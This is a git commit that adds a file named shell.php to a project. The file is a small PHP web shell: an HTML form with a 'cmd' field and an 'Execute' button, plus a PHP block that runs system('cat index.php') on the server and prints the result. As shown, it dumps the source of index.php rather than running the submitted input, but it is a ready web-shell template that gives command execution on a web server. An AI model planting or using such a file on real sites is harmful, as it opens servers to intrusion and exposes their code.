4e2b80c9f26c3f622f80cac1b5dde6cdf44fd424
vinhdzzai <vinhquangeuro@gmail.com>
2026-06-09 17:35:18 +0700

    Create shell.php

---
+++ shell.php
@@ -0,0 +1,13 @@
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+   system('cat index.php');
+?>
+</pre>
+</body>
+</html>
